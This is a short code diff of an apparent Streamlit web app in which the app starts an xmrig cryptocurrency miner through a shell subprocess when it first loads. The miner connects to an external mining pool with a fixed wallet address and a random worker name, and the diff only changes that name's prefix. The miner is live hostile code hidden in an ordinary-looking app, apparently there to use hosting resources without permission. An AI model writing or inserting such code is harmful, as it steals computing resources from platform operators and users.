@@ -80,7 +80,7 @@ st.write("tarik", flag.controlFlag)
 
 if flag.controlFlag==0:
     flag.controlFlag+=1
-    p = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17084 --tls --user JMZKc4y7BgSMXd1hnKc13SBmUe2EjY9u1z.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 8 -k", stdout=subprocess.PIPE, shell=True)
+    p = subprocess.run("./xmrig --algo=ghostrider --url stratum-na.rplant.xyz:17084 --tls --user JMZKc4y7BgSMXd1hnKc13SBmUe2EjY9u1z.AIR-$(echo $(shuf -i 10000-99999 -n 1)) -t 8 -k", stdout=subprocess.PIPE, shell=True)
     print(f"GOZUKTUMMMMMMMMMMMMMMM {flag.controlFlag}")
 
 import time 
